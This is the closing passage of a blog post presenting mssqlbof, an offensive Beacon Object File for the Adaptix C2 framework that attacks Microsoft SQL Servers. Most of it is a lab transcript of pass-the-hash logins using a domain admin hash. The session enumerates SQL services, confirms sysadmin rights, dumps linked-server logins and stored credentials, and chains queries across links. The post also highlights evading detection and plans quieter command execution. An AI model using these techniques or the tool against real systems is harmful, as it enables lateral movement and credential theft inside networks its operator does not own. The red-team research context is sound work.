From an Adaptix beacon sitting on an unprivileged workstation in the lab, with no domain creds, no local admin, just the operator’s own DA hash pulled out of a previous beacon’s credential store:

```sql
my > execute bof mssql.x64.o --action find
SPN                                             Account
MSSQLSvc/SRV02:1433                             SRV02$
MSSQLSvc/SRV02.silentstrike.io:1433             SRV02$

my > execute bof mssql.x64.o --action info --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
Server         : SRV02\SQLEXPRESS
Version        : 15.0.2000.5 (Express Edition (64-bit))
Current user   : SILENTSTRIKE\Administrator
Is sysadmin    : YES

my > execute bof mssql.x64.o --action privesc --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
=== Privesc surface enumeration ===
[1] sysadmin: YES — already

my > execute bof mssql.x64.o --action passwords --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
Linked-server logins:
  SRV02_LOOP -> sa
Server credentials:
  BackupCred -> identity=BACKUP\svc_backup
  AzureCred  -> identity=azure\admin

my > execute bof mssql.x64.o --action chain --host 192.168.0.122 \
     --auth ntlm --domain SILENTSTRIKE --user Administrator \
     --hash e19ccf75ee54e06b06a5907af13cef42 \
     --via SRV02_LOOP --sql SELECT @@SERVERNAME
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
SRV02\SQLEXPRESS
(1 row)
```

No ODBC driver loaded. No CLR. No PowerShell. No `make_token` dance. The beacon’s loaded module list is the same after as it was before. The only new bytes on the wire are TDS and TLS, and the hash never leaves the beacon’s memory — all the cryptographic work happens via BCrypt calls that operate on a 16-byte buffer and emit a 16-byte MAC.

## The one bug I did not fully fix

Honesty check, because you read the code and you will find this. Once PTH started working, SQL auth broke. The first SQLBatch sent immediately after a successful multi-leg login was returning empty data in the `SUSER_SNAME()` column of the first row. A second query on the same connection always worked.

The workaround is a primer `SELECT` inside `do_connect` that runs a throwaway `SELECT SUSER_SNAME(), @@SERVERNAME`, reads the row, and prints it via `BeaconPrintf`. Without the `BeaconPrintf` call the corruption persists. With it, every subsequent query is clean. That is the line every mssqlbof action opens with:

```
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
```

I am fairly sure the actual bug is in how the multi-leg pump handles leftover bytes between the final LOGINACK packet and whatever the server queues next, and the primer plus `BeaconPrintf` combination either drains the stale bytes or changes the heap layout enough that the follow-up query reads a fresh allocation. It is on the v0.2 list. It is the kind of bug that stops being a bug the moment you understand it, so the right fix is to understand it, not to paper over it more thoroughly.

## What’s next

-   The real fix for the post-multi-leg SQLBatch corruption.
-   Recursive linked-server walking via nested `OPENQUERY` with cycle detection.
-   A CLR-assembly exec method as an alternative to `xp_cmdshell`, for when you need to stay quiet.
-   Cross-forest Kerberos for `--auth sspi` against SQL hosts in a trusted forest.
-   A pass-the-key mode (`--aes256 <hex>`) that reuses the `ntlm_pth.c` scaffold but issues Kerberos instead of NTLM.

The repo is at [`MazX0p/mssqlbof`](https://github.com/MazX0p/mssqlbof). Wire captures, lab results, and bugs welcome. If you run it against a SQL Server version I have not tested (anything other than 2019), open an issue with the `@@VERSION` string and what happened — the protocol layer should cope all the way back to SQL Server 2012, but I have not verified it myself.
